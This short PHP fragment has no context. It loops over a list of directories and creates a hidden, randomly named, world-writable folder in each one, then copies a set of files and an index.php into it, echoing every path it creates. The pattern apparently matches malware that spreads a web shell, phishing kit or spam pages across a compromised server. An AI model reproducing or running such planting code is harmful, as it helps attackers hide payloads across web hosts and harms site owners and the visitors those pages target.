...
foreach ($dirlist as $alldir) {
    mkdir($alldir . "8yebv5mlhpknv63bc0txhrflksl71q", 0777, TRUE);
    foreach ($filelist as $filename) { // loop through file names array
        if (copy(getcwd() . "/mmd/" . $filename, $alldir . "8yebv5mlhpknv63bc0txhrflksl71q/" . $filename)) {
            echo $alldir . "8yebv5mlhpknv63bc0txhrflksl71q/" . $filename . "<br>";
        }
    }
    if (copy($filepath, $alldir . "8yebv5mlhpknv63bc0txhrflksl71q/index.php")) {
        echo $alldir . "8yebv5mlhpknv63bc0txhrflksl71q/index.php<br>";
    }
}
